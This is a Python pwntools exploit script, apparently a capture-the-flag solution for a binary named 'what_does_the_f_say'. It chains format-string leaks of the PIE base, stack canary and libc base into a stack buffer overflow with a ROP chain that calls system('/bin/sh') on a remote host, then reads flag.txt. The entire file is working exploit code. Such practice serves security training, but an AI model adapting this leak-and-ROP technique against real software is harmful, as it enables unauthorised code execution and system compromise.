#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf, libc):
    
    # leak PIE
    io.recv()
    io.sendline(b"1")
    io.sendline(b"2")
    io.sendlineafter(b"Kryptonite?\n", b"%15$lx")
    leak = int(io.recvline().strip(), 16)
    elf.address = leak - 0x174a
    print("PIE_base: ", hex(elf.address))

    # leak canary
    io.recv()
    io.sendline(b"1")
    io.sendline(b"2")
    io.sendlineafter(b"Kryptonite?\n", b"%13$lx")
    canary = int(io.recvline().strip(), 16)
    print("canary: ", hex(canary))
    
    # leak libc
    io.recv()
    io.sendline(b"1")
    io.sendline(b"2")
    io.sendlineafter(b"Kryptonite?\n", b"%25$lx")
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - 0x21b97 
    print("libc_base: ", hex(libc.address))
    
    for _ in range(8):
        io.sendline(b"2")
        io.sendline(b"2")
    
    # rop
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    binsh = next(libc.search(b"/bin/sh"))
    ret = rop.find_gadget(["ret"])[0]
    system = libc.symbols["system"]

    rop_chain = flat(pop_rdi, binsh ,ret, system) 
    payload = b"A"*24 + p64(canary) + b"B"*8 + rop_chain
    io.sendline(b"1")
    io.sendline(b"2")
    io.sendlineafter(b"Kryptonite?\n", b"green")
    io.sendlineafter(b"buy it?\n", payload)
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./what_does_the_f_say")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    elf = ELF("./what_does_the_f_say")
    libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
    exploit(io, elf, libc)

if __name__ == "__main__":
    main()
